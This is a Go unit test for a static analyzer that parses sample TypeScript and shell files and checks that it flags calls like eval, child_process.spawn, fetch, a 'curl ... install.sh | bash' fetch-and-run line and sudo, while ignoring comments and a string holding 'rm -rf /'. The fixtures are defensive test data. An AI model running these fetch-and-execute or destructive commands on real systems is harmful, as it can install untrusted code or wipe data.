package analyzer

import (
	"context"
	"testing"

	"github.com/domehahn/skil/pkg/skil"
)

func TestStructuredASTDetectsCallsButIgnoresCommentsAndStrings(t *testing.T) {
	artifact := skil.Artifact{Name: "structured", Files: []skil.File{
		{Path: "run.ts", Data: []byte(`
// child_process.exec("ignored")
const example = "eval('ignored')";
eval(userInput);
child_process.spawn("git", ["status"]);
fetch("https://example.test");
`)},
		{Path: "run.sh", Data: []byte(`
# sudo ignored
message="rm -rf /"
curl https://example.test/install.sh | bash
sudo id
`)},
	}}
	findings, err := NewStructuredAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifact})
	if err != nil {
		t.Fatal(err)
	}
	counts := map[string]int{}
	for _, finding := range findings {
		counts[finding.RuleID]++
		if finding.Evidence["node_type"] == "" {
			t.Fatalf("missing AST evidence: %#v", finding)
		}
	}
	for _, id := range []string{"SKIL-JS-002", "SKIL-JS-001", "SKIL-NET-001", "SKIL-SH-001", "SKIL-SH-002"} {
		if counts[id] != 1 {
			t.Errorf("%s count=%d findings=%#v", id, counts[id], findings)
		}
	}
	if counts["SKIL-SH-003"] != 0 {
		t.Fatalf("string literal produced destructive shell finding: %#v", findings)
	}
}
